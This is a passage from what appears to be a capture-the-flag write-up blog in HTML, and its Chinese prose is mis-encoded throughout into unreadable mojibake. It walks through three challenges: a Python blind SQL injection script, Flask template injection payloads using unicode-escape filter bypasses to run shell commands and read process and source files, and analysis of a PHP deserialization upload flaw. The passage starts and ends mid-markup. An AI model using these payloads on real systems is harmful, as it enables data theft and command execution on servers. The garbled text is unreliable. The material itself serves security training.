id="ç›²æ³¨ä¹‹asciiåç§»"><a href="#ç›²æ³¨ä¹‹asciiåç§»" class="headerlink" title="ç›²æ³¨ä¹‹asciiåç§»"></a>ç›²æ³¨ä¹‹asciiåç§»</h2><p>ä½¿ç”¨åœºæ™¯</p><ul><li><p>å…³é”®å­—æ— è¿‡æ»¤</p></li><li><p>select * from flag;çš„è¿”å›å€¼åªèƒ½ä¸º1è¡Œ</p></li></ul><ol><li><p>åˆ¤æ–­å­—æ®µæ•°</p><p>å‡è®¾æœ‰å¦‚ä¸‹è¡¨ï¼Œåˆ—æ•°ä¸º2</p><p><img src="/../images/image-20220711155449466-1687489655114.png" alt="image-20220711155449466"></p><p>ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ä¼šæŠ¥é”™</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> (<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>)<span class="operator">&gt;</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> flag)</span><br></pre></td></tr></table></figure></li><li><p>åˆ¤æ–­å­—æ®µå€¼</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span>(<span class="number">1</span>,<span class="number">1</span>)<span class="operator">&gt;</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> flag)</span><br></pre></td></tr></table></figure></li></ol><p><img src="/../images/image-20220711155653013-1687489655114.png" alt="image-20220711155653013"></p><p>â€‹      <code>select(1,1)</code>çš„è¿”å›å€¼ä¸º1,1;  <code>select * from flag</code>çš„è¿”å›å€¼ä¸º1ï¼Œâ€™flag{xxxx}â€™ï¼›</p><p>â€‹      1ä¸1æ¯”è¾ƒç›¸ç­‰ï¼Œ1ä¸â€™flag{xxxx}â€™æ¯”è¾ƒï¼Œ1&gt;â€™fâ€™,æ‰€ä»¥æœ€åè¿”å›çš„æ˜¯1ã€‚</p><blockquote><p>â€‹     å› ä¸ºmysqlä¸­æ•°å­—ä¸å­—ç¬¦ä¸²æ¯”è¾ƒä¸phpä¸­ç›¸åŒã€‚</p></blockquote><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ ¹æ®æ­¤æ¥ç¼–å†™è„šæœ¬</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&#x27;http://f6dc9323-7652-4182-8dd7-aea9fd09183f.node4.buuoj.cn:81/index.php&#x27;</span></span><br><span class="line"><span class="comment">#&#123;&#125;çš„ä½ç½®æ˜¯æƒ³è¦è¯»å–çš„å­—æ®µå€¼æ‰€åœ¨åˆ—</span></span><br><span class="line">payload=<span class="string">&#x27;0^((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        </span><br><span class="line">        hexchar=flag+<span class="built_in">chr</span>(j)</span><br><span class="line"></span><br><span class="line">        params=&#123;<span class="string">&#x27;id&#x27;</span>:payload.<span class="built_in">format</span>(hexchar)&#125;</span><br><span class="line"></span><br><span class="line">        re=requests.post(url=url,data=params)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Nu1L&#x27;</span> <span class="keyword">in</span> re.text:</span><br><span class="line">            <span class="comment"># -1æ˜¯å› ä¸ºå½“&gt;æˆç«‹æ—¶ï¼Œå·®å€¼ä¸º1</span></span><br><span class="line">            flag+=<span class="built_in">chr</span>(j-<span class="number">1</span>)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><p>[ç½‘é¼æ¯ 2020 ç™½è™ç»„]PicDown</p><p>[pasecactf_2019]flask_ssti</p><p>æç¤º</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">line, key, key2</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(x ^ <span class="built_in">ord</span>(line[x]) ^ <span class="built_in">ord</span>(key[::-<span class="number">1</span>][x]) ^ <span class="built_in">ord</span>(key2[x])) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(line)))</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;flag&#x27;</span>] = encode(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W34&#x27;</span>, <span class="string">&#x27;xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT5&#x27;</span>)</span><br></pre></td></tr></table></figure><p>åœ¨configä¸­ä¿å­˜äº†flagåŠ å¯†åçš„å€¼ã€‚</p><p>è¿™é¢˜è¦å¼€ä»£ç†æ‰èƒ½åšï¼Œä¸ç„¶æ–‡ä»¶åŠ è½½ä¸äº†ã€‚ã€‚</p><p><img src="/../images/image-20221008124443508-1686983099354.png" alt="image-20221008124443508"></p><p>æœ‰è¿‡æ»¤ï¼Œunicodeç¼–ç ç»•è¿‡</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[][<span class="string">&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;</span>][<span class="string">&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f&quot;</span>][<span class="string">&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;</span>]()&#125;&#125;</span><br></pre></td></tr></table></figure><p>æœ‰å›æ˜¾å½“å‰ç¯å¢ƒä¸‹çš„ç±»ï¼Œé‚£å°±æ­£å¸¸æ‰¾å¯åˆ©ç”¨ç±»çš„ä½ç½®</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;()[<span class="string">&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;</span>][<span class="string">&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f&quot;</span>][<span class="number">0</span>][<span class="string">&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;</span>]()[<span class="number">80</span>][<span class="string">&quot;\u006c\u006f\u0061\u0064\u005f\u006d\u006f\u0064\u0075\u006c\u0065&quot;</span>](<span class="string">&quot;os&quot;</span>)[<span class="string">&quot;popen&quot;</span>](<span class="string">&quot;ls /&quot;</span>)|attr(<span class="string">&quot;read&quot;</span>)()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221008124706289-1686983099353.png" alt="image-20221008124706289"></p><p>å¯ä»¥çœ‹åˆ°æ˜¯å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„ã€‚ç„¶åæ ¹æ®æç¤ºï¼Œå°±éœ€è¦æˆ‘ä»¬è¯»å–pythonæ–‡ä»¶ã€‚</p><h5 id="æ³¨æ„ç‚¹"><a href="#æ³¨æ„ç‚¹" class="headerlink" title="æ³¨æ„ç‚¹"></a>æ³¨æ„ç‚¹</h5><blockquote><ol><li><strong>åœ¨ linux ç³»ç»Ÿä¸­å¦‚æœä¸€ä¸ªç¨‹åºç”¨open()æ‰“å¼€äº†ä¸€ä¸ªæ–‡ä»¶ä½†æœ€ç»ˆæ²¡æœ‰å…³é—­ä»–ï¼Œå³ä¾¿ä»å¤–éƒ¨ï¼ˆå¦‚os.remove(SECRET_FILE)ï¼‰åˆ é™¤è¿™ä¸ªæ–‡ä»¶ä¹‹åï¼Œåœ¨ &#x2F;proc è¿™ä¸ªè¿›ç¨‹çš„ pid ç›®å½•ä¸‹çš„ fd æ–‡ä»¶æè¿°ç¬¦ç›®å½•ä¸‹è¿˜æ˜¯ä¼šæœ‰è¿™ä¸ªæ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œé€šè¿‡è¿™ä¸ªæ–‡ä»¶æè¿°ç¬¦æˆ‘ä»¬å³å¯å¾—åˆ°è¢«åˆ é™¤æ–‡ä»¶çš„å†…å®¹ã€‚</strong></li><li><strong><code>/proc/self</code>åœ¨ä½¿ç”¨æ—¶ï¼Œæˆ‘ä»¬æ˜¯ä¸èƒ½é€šè¿‡å‘½ä»¤çš„æ–¹å¼æ‰§è¡Œé€šè¿‡catå‘½ä»¤è¯»å–cmdlineçš„ï¼Œå› ä¸ºå¦‚æœæ˜¯catè¯»å–&#x2F;proc&#x2F;self&#x2F;cmdlineçš„è¯ï¼Œå¾—åˆ°çš„æ˜¯catè¿›ç¨‹çš„ä¿¡æ¯ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦é€šè¿‡é¢˜ç›®çš„å½“å‰è¿›ç¨‹ä½¿ç”¨è¯»å–æ–‡ä»¶ï¼ˆå¦‚æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œæˆ–è€…SSTIä½¿ç”¨fileæ¨¡å—è¯»å–æ–‡ä»¶ï¼‰çš„æ–¹å¼è¯»å–&#x2F;proc&#x2F;self&#x2F;cmdlineã€‚</strong></li></ol></blockquote><ul><li><p>è¯»å–å½“å‰è¿›ç¨‹</p><ul><li><p>&lt;class â€˜_frozen_importlib_external.FileLoaderâ€™&gt;è¿™ä¸ªç±»ï¼Œå…¶ä¸‹æœ‰[â€œget_dataâ€]æ–¹æ³•å¯ä»¥è¯»å–æ–‡ä»¶ã€‚</p></li><li><p>ä¸ºä»€ä¹ˆä¸èƒ½ç›´æ¥ç”¨å‘½ä»¤catè¯»å–å‘¢ï¼Ÿ</p><p>å› ä¸º&#x2F;proc&#x2F;selfå­˜å‚¨çš„æ˜¯å½“å‰è¿›ç¨‹ä¸‹çš„ä¿¡æ¯ï¼Œå¦‚æœä½¿ç”¨catå‘½ä»¤è¯»å–çš„å°±æ˜¯catè¿›ç¨‹çš„ä¿¡æ¯ï¼Œè€Œä¸æ˜¯å½“å‰è¿›ç¨‹çš„ä¿¡æ¯ã€‚</p></li></ul></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;()[<span class="string">&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;</span>][<span class="string">&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f&quot;</span>][<span class="number">0</span>][<span class="string">&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;</span>]()[<span class="number">91</span>][<span class="string">&quot;\u0067\u0065\u0074\u005f\u0064\u0061\u0074\u0061&quot;</span>](<span class="number">0</span>, <span class="string">&quot;/proc/self/cmdline&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221008125010896-1686983099354.png" alt="image-20221008125010896"></p><ul><li>è¯»å–app.py,è¿™é‡Œapp.pyä¹Ÿè¢«è¿‡æ»¤äº†</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;()[<span class="string">&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;</span>][<span class="string">&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f&quot;</span>][<span class="number">0</span>][<span class="string">&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;</span>]()[<span class="number">91</span>][<span class="string">&quot;\u0067\u0065\u0074\u005f\u0064\u0061\u0074\u0061&quot;</span>](<span class="number">0</span>, <span class="string">&quot;\u0061\u0070\u0070\u002e\u0070\u0079&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p>æ•´ç†ä¸€ä¸‹å¾—åˆ°çš„æºç ï¼Œå‘ç°æŠŠæœ€é‡è¦çš„éƒ¨åˆ†æ”¾åœ¨äº†æ³¨é‡Šé‡Œã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;/app/flag&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">flag = file.read()</span><br><span class="line">flag = flag[:<span class="number">42</span>]</span><br><span class="line">app.config[<span class="string">&#x27;flag&#x27;</span>] = encode(flag, <span class="string">&#x27;GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3&#x27;</span>, <span class="string">&#x27;xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT&#x27;</span>)</span><br><span class="line">flag = os.remove(<span class="string">&quot;/app/flag&quot;</span>)</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°flagæ˜æ–‡æ˜¯æ”¾åœ¨&#x2F;app&#x2F;flagä¸­çš„ï¼Œå¹¶ä¸”åªè¿›è¡Œäº†openæ“ä½œï¼Œæ²¡æœ‰closeæ“ä½œã€‚</p><blockquote><p><strong>åœ¨ linux ç³»ç»Ÿä¸­å¦‚æœä¸€ä¸ªç¨‹åºç”¨open()æ‰“å¼€äº†ä¸€ä¸ªæ–‡ä»¶ä½†æœ€ç»ˆæ²¡æœ‰å…³é—­ä»–ï¼Œå³ä¾¿ä»å¤–éƒ¨ï¼ˆå¦‚os.remove(SECRET_FILE)ï¼‰åˆ é™¤è¿™ä¸ªæ–‡ä»¶ä¹‹åï¼Œåœ¨ &#x2F;proc è¿™ä¸ªè¿›ç¨‹çš„ pid ç›®å½•ä¸‹çš„ fd æ–‡ä»¶æè¿°ç¬¦ç›®å½•ä¸‹è¿˜æ˜¯ä¼šæœ‰è¿™ä¸ªæ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œé€šè¿‡è¿™ä¸ªæ–‡ä»¶æè¿°ç¬¦æˆ‘ä»¬å³å¯å¾—åˆ°è¢«åˆ é™¤æ–‡ä»¶çš„å†…å®¹ã€‚</strong></p></blockquote><p>æ‰€ä»¥æˆ‘ä»¬è¦å»è¯»å–&#x2F;proc&#x2F;self&#x2F;fd&#x2F;ï¼Ÿ,å¾—åˆ°&#x2F;app&#x2F;flagæ–‡ä»¶</p><p>payload</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;()[<span class="string">&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;</span>][<span class="string">&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f&quot;</span>][<span class="number">0</span>][<span class="string">&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;</span>]()[<span class="number">91</span>][<span class="string">&quot;\u0067\u0065\u0074\u005f\u0064\u0061\u0074\u0061&quot;</span>](<span class="number">0</span>, <span class="string">&quot;/proc/self/fd/3&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>3æ˜¯é€šè¿‡burpçˆ†ç ´å¾—åˆ°çš„ã€‚</p></blockquote><p>å®é™…ä¸Šè¿˜æœ‰å¦ä¸€ç§è§£æ³•ï¼Œå› ä¸ºæç¤ºä¸­ç»™äº†flagæ˜¯æ”¾åœ¨configç¯å¢ƒå˜é‡ä¸­çš„ï¼ŒåŠ å¯†ç®—æ³•ç”¨äº†å¼‚æˆ–æ˜¯å¯¹ç§°åŠ å¯†ï¼Œè€Œä¸”è¿™é“é¢˜æ²¡æœ‰è¿‡æ»¤configï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥<code>&#123;&#123;config&#125;&#125;</code>æ‹¿åˆ°åŠ å¯†åçš„flagï¼Œå¯¹å…¶è¿›è¡ŒåŠ å¯†å°±èƒ½å¾—åˆ°flagçš„æ˜æ–‡å½¢å¼äº†ã€‚</p><h1 id="phpååºåˆ—åŒ–"><a href="#phpååºåˆ—åŒ–" class="headerlink" title="phpååºåˆ—åŒ–"></a>phpååºåˆ—åŒ–</h1><h2 id="å¼ºç½‘æ¯-2019-Upload"><a href="#å¼ºç½‘æ¯-2019-Upload" class="headerlink" title="[å¼ºç½‘æ¯ 2019]Upload"></a>[å¼ºç½‘æ¯ 2019]Upload</h2><p>cookieä¸­å­˜åœ¨åºåˆ—åŒ–å†…å®¹</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">5</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;ID&quot;</span>;i:<span class="number">3</span>;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;khaz&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;123@qq.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">32</span>:<span class="string">&quot;202cb962ac59075b964b07152d234b70&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">79</span>:<span class="string">&quot;../upload/c47b21fcf8f0bc8b3920541abd8024fd/8052c42ab3b8aa06a3f5f788a4ddccc2.png&quot;</span>&#125;</span><br></pre></td></tr></table></figure><blockquote><p>ä¿å­˜çš„æ˜¯æˆ‘ä»¬ç”¨æˆ·çš„ä¿¡æ¯</p></blockquote><p>ä¿¡æ¯æ”¶é›†å¾—åˆ°æºä»£ç </p><p>åºåˆ—åŒ–</p><p>Login::login</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#ç™»å½•åï¼Œè®¾ç½®cookie&#123;user:base64_encode(serialize($user_info))&#125;</span></span><br><span class="line">            <span class="variable">$user_info</span>=<span class="title function_ invoke__">db</span>(<span class="string">&quot;user&quot;</span>)-&gt;<span class="title function_ invoke__">where</span>(<span class="string">&quot;email&quot;</span>,<span class="variable">$email</span>)-&gt;<span class="title function_ invoke__">find</span>();</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$user_info</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>) === <span class="variable">$user_info</span>[<span class="string">&#x27;password&#x27;</span>]) &#123;</span><br><span class="line">                    <span class="variable">$cookie_data</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user_info</span>));</span><br><span class="line">                    <span class="title function_ invoke__">cookie</span>(<span class="string">&quot;user&quot;</span>,<span class="variable">$cookie_data</span>,<span class="number">3600</span>);</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">success</span>(<span class="string">&#x27;Login successful!&#x27;</span>, <span class="title function_ invoke__">url</span>(<span class="string">&#x27;../home&#x27;</span>));</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="string">&#x27;Login failed!&#x27;</span>, <span class="title function_ invoke__">url</span>(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>Profile::update_cookie</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#æ›´æ¢å¤´åƒåï¼Œæ›´æ–°cookie</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_cookie</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;checker-&gt;profile[<span class="string">&#x27;img&#x27;</span>]=<span class="variable language_">$this</span>-&gt;img;</span><br><span class="line">        <span class="title function_ invoke__">cookie</span>(<span class="string">&quot;user&quot;</span>,<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$this</span>-&gt;checker-&gt;profile)),<span class="number">3600</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ååºåˆ—åŒ–</p><p>Index::login_check()</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login_check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$profile</span>=<span class="title function_ invoke__">cookie</span>(<span class="string">&#x27;user&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$profile</span>))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;profile=<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$profile</span>));</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;profile_db=<span class="title function_ invoke__">db</span>(<span class="string">&#x27;user&#x27;</span>)-&gt;<span class="title function_ invoke__">where</span>(<span class="string">&quot;ID&quot;</span>,<span class="title function_ invoke__">intval</span>(<span class="variable">$this</span>-&gt;profile[<span class="string">&#x27;ID&#x27;</span>]))-&gt;<span class="title function_ invoke__">find</span>();</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">array_diff</span>(<span class="variable">$this</span>-&gt;profile_db,<span class="variable">$this</span>-&gt;profile)==<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><blockquote><p>è¯¥å‡½æ•°ç”¨äºæ£€éªŒç”¨æˆ·æ˜¯å¦å·²ç™»å½•ï¼Œåœ¨ç™»å½•åçš„æ¯ä¸ªç•Œé¢éƒ½è¦è¢«è°ƒç”¨ã€‚</p></blockquote><p>æ–‡ä»¶ä¸Šä¼ åçš„æ“ä½œ</p><p>ç»å…¸phpæ–‡ä»¶ä¸Šä¼ æ“ä½œï¼Œå¼•ç”¨èœé¸Ÿæ•™ç¨‹çš„gif</p><p><img src="/../images/upload-form.gif" alt="img"></p><p>æœ€åå¾—åˆ°çš„å›¾ç‰‡è·¯å¾„å°±æ˜¯è¿™æ ·çš„</p><p>..&#x2F;upload&#x2F;c47b21fcf8f0bc8b3920541abd8024fd&#x2F;8052c42ab3b8aa06a3f5f788a4ddccc2.png</p><blockquote><p>å› ä¸ºåç¼€åä¸€å®šæ˜¯pngï¼Œæ‰€ä»¥æ­£å¸¸æ¥è¯´æ˜¯æ— æ³•åˆ©ç”¨çš„ï¼Œä½†æ˜¯è¿™é‡Œå­˜åœ¨ååºåˆ—åŒ–æ¼æ´ï¼Œå¯¼è‡´æˆ‘ä»¬å¯ä»¥è‡ªå®šä¹‰æ–‡ä»¶å</p></blockquote><p>Profile::upload_img()</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_img</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">#è°ƒç”¨Index::login_check(),æ£€éªŒç”¨æˆ·æ˜¯å¦å­˜åœ¨</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;checker)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;checker-&gt;<span class="title function_ invoke__">login_check</span>())&#123;</span><br><span class="line">                <span class="variable">$curr_url</span>=<span class="string">&quot;http://&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>].<span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>].<span class="string">&quot;/index&quot;</span>;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">redirect</span>(<span class="variable">$curr_url</span>,<span class="number">302</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">#å¯¹ä¸Šä¼ æ–‡ä»¶çš„æ–‡ä»¶åè¿›è¡Œå¤„ç†</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>))&#123;</span><br><span class="line">            <span class="comment">#è®¾ç½®ä¸´æ—¶æ–‡ä»¶å</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;filename_tmp=<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="comment">#è®¾ç½®æ–‡ä»¶åï¼ŒåŠ ä¸Š.pngåç¼€</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;filename=<span class="title function_ invoke__">md5</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">            <span class="comment">#æ£€éªŒæ–‡ä»¶åç¼€åæ˜¯å¦ä¸ºpng</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">ext_check</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;ext) &#123;</span><br><span class="line">            <span class="comment">#è·å–æ–‡ä»¶å¤§å°åˆ¤æ–­æ˜¯å¦ä¸º å›¾ç‰‡</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">getimagesize</span>(<span class="variable">$this</span>-&gt;filename_tmp)) &#123;</span><br><span class="line">                <span class="comment">#å°†ä¸´æ—¶æ–‡ä»¶å¤åˆ¶åˆ°åˆ›å»ºçš„æ–‡ä»¶ä¸­</span></span><br><span class="line">                @<span class="title function_ invoke__">copy</span>(<span class="variable">$this</span>-&gt;filename_tmp, <span class="variable">$this</span>-&gt;filename);</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename_tmp);</span><br><span class="line">                <span class="comment">#è®¾ç½®å›¾ç‰‡è·¯å¾„</span></span><br><span class="line">                <span class="variable language_">$this</span>-&gt;img=<span class="string">&quot;../upload/<span class="subst">$this</span>-&gt;upload_menu/<span class="subst">$this</span>-&gt;filename&quot;</span>;</span><br><span class="line">                <span class="comment">#æ›´æ–°å¤´åƒå›¾ç‰‡</span></span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">update_img</span>();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="string">&#x27;Forbidden type!&#x27;</span>, <span class="title function_ invoke__">url</span>(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="string">&#x27;Unknow file type!&#x27;</span>, <span class="title function_ invoke__">url</span>(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å…³æ³¨</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#å°†ä¸´æ—¶æ–‡ä»¶å¤åˆ¶åˆ°åˆ›å»ºçš„æ–‡ä»¶ä¸­</span></span><br><span class="line">@<span class="title function_ invoke__">copy</span>(<span class="variable">$this</span>-&gt;filename_tmp, <span class="variable">$this</span>-&gt;filename);</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename_tmp);</span><br><span class="line"><span class="comment">#è®¾ç½®å›¾ç‰‡è·¯å¾„</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;img=<span class="string">&quot;../upload/<span class="subst">$this</span>-&gt;upload_menu/<span class="subst">$this</span>-&gt;filename&quot;</span>;</span><br></pre></td></tr></table></figure><blockquote><p>ä»¤filename_tmpä¸ºæˆ‘ä»¬ä¸Šä¼ çš„æœ¨é©¬æ–‡ä»¶è·¯å¾„</p><p>åªè¦æˆ‘ä»¬å¯ä»¥æ§åˆ¶filenameï¼Œæˆ‘ä»¬å°±å¯ä»¥è‡ªå®šä¹‰æœ¨é©¬æ–‡ä»¶çš„æ–‡ä»¶åï¼Œå°±å¯ä»¥è§£ææœ¨é©¬æ–‡ä»¶</p></blockquote><p>çœ‹ä¸€ä¸‹Profileç±»çš„é­”æœ¯æ–¹æ³•</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;except[<span class="variable">$name</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;&#123;<span class="variable">$name</span>&#125;)&#123;</span><br><span class="line">            <span class="variable 